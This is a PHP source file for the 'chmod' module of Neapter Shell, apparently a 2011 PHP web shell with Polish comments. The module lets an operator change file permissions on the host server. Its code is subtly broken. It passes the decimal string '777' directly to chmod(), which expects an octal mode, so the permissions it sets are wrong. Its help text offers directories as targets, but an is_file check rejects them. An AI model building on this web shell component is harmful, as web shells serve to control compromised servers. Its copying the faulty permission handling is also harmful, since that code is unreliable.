<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2011, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * ModuleChmod - Zmienianie uprawnien dla pliku
 */
class ModuleChmod implements ShellInterface
{
	/**
	 * Obiekt Shell
	 *
	 * @access private
	 * @var    object
	 */
	private $oShell;

	/**
	 * Konstruktor
	 *
	 * @access public
	 * @param  object $oShell Obiekt Shell
	 * @return void
	 */
	public function __construct( Shell $oShell )
	{
		$this -> oShell = $oShell;
	}

	/**
	 * Dostepna lista komend
	 *
	 * @access public
	 * @return array
	 */
	public function getCommands()
	{
		return array( 'chmod' );
	}

	/**
	 * Zwracanie wersji modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getVersion()
	{
		/**
		 * Wersja Data Autor
		 */
		return '1.0 2011-06-04 - <krzotr@gmail.com>';
	}

	/**
	 * Zwracanie pomocy modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getHelp()
	{
		return <<<DATA
Zmiana uprawnień dla pliku

	Użycie:
		chmod uprawnienie plik_lub_katalog

	Przykład:
		chmod 777 /tmp/plik
DATA;
	}

	/**
	 * Wywolanie modulu
	 *
	 * @access public
	 * @return string
	 */
	public function get()
	{
		/**
		 * Help
		 */
		if( $this -> oShell -> iArgc === 2 )
		{
			return $this -> getHelp();
		}

		/**
		 * Chmod jest wymagany
		 */
		if( ! ctype_digit( $this -> oShell -> aArgv[0] ) || strlen( $this -> oShell -> aArgv[0] ) !== 3 )
		{
			return sprintf( 'Błędny chmod "%d"', $this -> oShell -> aArgv[0] );
		}

		/**
		 * Plik musi istniec
		 */
		if( ! is_file( $this -> oShell -> aArgv[1] ) )
		{
			return sprintf( 'Plik "%s" nie istnieje', $this -> oShell -> aArgv[1] );
		}

		if( chmod( $this -> oShell -> aArgv[1], $this -> oShell -> aArgv[0] ) )
		{
			return 'Uprawnienia <span class="green">zostały zmienione</span>';
		}

		return 'Uprawnienia <span class="red">nie zostały zmienione</span>';
	}

}